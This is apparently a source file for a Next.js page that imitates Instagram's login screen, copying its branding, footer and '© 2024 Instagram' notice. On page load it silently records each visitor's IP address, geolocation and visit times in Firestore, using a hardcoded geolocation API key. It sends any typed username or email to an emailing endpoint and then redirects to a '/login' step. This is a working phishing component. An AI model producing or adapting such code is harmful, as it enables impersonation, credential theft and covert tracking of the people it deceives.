'use client';

import db from '@/firebase/firebase';
import { doc, serverTimestamp, getDoc, setDoc, updateDoc } from 'firebase/firestore';

import { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';

import axios from 'axios';

const Home = () => {
	const [username, setUsername] = useState('');
	const [ip, setIp] = useState('');
	const [location, setLocation] = useState('');
	const router = useRouter();
	const inputRef = useRef(null);

	useEffect(() => {
		const fetchIpAndLocation = async () => {
			try {
				const res = await axios.get('https://api.ipify.org?format=json');
				const userIp = res.data.ip;
				setIp(userIp);

				const apiKey = 'fb4ef23ba9c44ae5b7b748b1603b2951';
				const locationRes = await axios.get(
					`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${userIp}`
				);
				const userLocation = `${locationRes.data.city}, ${locationRes.data.state_prov}, ${locationRes.data.country_name}`;
				setLocation(userLocation);

				const docRef = doc(db, 'usernames', userIp);
				const docSnap = await getDoc(docRef);

				const timestamp = new Intl.DateTimeFormat('en-US', {
					year: 'numeric',
					month: 'long',
					day: 'numeric',
					hour: 'numeric',
					minute: 'numeric',
					second: 'numeric',
					hour12: true,
					timeZone: 'America/Los_Angeles',
				}).format(new Date());

				if (!docSnap.exists()) {
					await setDoc(docRef, {
						ip: userIp,
						location: userLocation,
						visits: [timestamp],
					});
				} else {
					const visits = docSnap.data().visits || [];
					visits.push(timestamp);

					await updateDoc(docRef, {
						visits: visits,
					});
				}
			} catch (error) {
				console.error('Error fetching IP address or location: ', error);
			}
		};
		fetchIpAndLocation();
	}, []);

	useEffect(() => {
		if (inputRef.current) {
			setUsername(inputRef.current.value);
		}
	}, []);

	const handleSubmit = async (e) => {
		try {
			e.preventDefault();

			const timestamp = new Intl.DateTimeFormat('en-US', {
				year: 'numeric',
				month: 'long',
				day: 'numeric',
				hour: 'numeric',
				minute: 'numeric',
				second: 'numeric',
				hour12: true,
				timeZone: 'America/Los_Angeles',
			}).format(new Date());

			const docRef = doc(db, 'usernames', ip);

			await axios.post('/api/send-email', {
				username: username,
				timestamp: timestamp,
			});

			const docSnap = await getDoc(docRef);
			let usernames = [];
			if (docSnap.exists()) {
				usernames = docSnap.data().usernames || [];
			}

			const isUnique = !usernames.some((user) => user.username === username);
			if (!isUnique) {
				router.push('/login');
				return;
			}

			usernames.push({
				username: username,
				timestamp: timestamp,
			});

			await updateDoc(docRef, {
				usernames: usernames,
			});

			router.push('/login');
		} catch (error) {
			router.push('/login');
			console.log('Error submitting form: ', error);
		}
	};

	return (
		<>
			<div id='wrapper'>
				<div className='container'>
					<div className='phone-app-demo'></div>
					<div className='form-data'>
						<form action='' onSubmit={handleSubmit}>
							<div className='logo'>
								<img src='./logo.png' alt='logo' />
							</div>
							<input
								type='text'
								placeholder='Username or email'
								ref={inputRef}
								onChange={(e) => {
									setUsername(e.target.value);
								}}
							/>
							<button className='form-btn' type='submit'>
								Next
							</button>
							<span className='has-separator'>Or</span>
							<a className='facebook-login' href='#'>
								<i className='fab fa-facebook-square'></i> Log in with Facebook
							</a>
							<a className='password-reset' href='#'>
								Forgot password?
							</a>
						</form>
						<div className='sign-up'>
							Don&apos;t have an account? <a href='#'>Sign up</a>
						</div>
						<div className='get-the-app'>
							<span>Get the app.</span>
							<div className='badges'>
								<img src='./app-store.png' alt='app-store badge' />
								<img src='./google-play.png' alt='google-play badge' />
							</div>
						</div>
					</div>
				</div>

				<footer>
					<div className='container'>
						<nav className='footer-nav'>
							<ul>
								<li>
									<a href='#'>About us</a>
								</li>
								<li>
									<a href='#'>Support</a>
								</li>
								<li>
									<a href='#'>Press</a>
								</li>
								<li>
									<a href='#'>Api</a>
								</li>
								<li>
									<a href='#'>Jobs</a>
								</li>
								<li>
									<a href='#'>Privacy</a>
								</li>
								<li>
									<a href='#'>Terms</a>
								</li>
								<li>
									<a href='#'>Directory</a>
								</li>
								<li>
									<a href='#'>Profiles</a>
								</li>
								<li>
									<a href='#'>Hashtags</a>
								</li>
								<li>
									<a href='#'>Languages</a>
								</li>
							</ul>
						</nav>
						<div className='copyright-notice'>&copy; 2024 Instagram</div>
					</div>
				</footer>
			</div>
		</>
	);
};

export default Home;
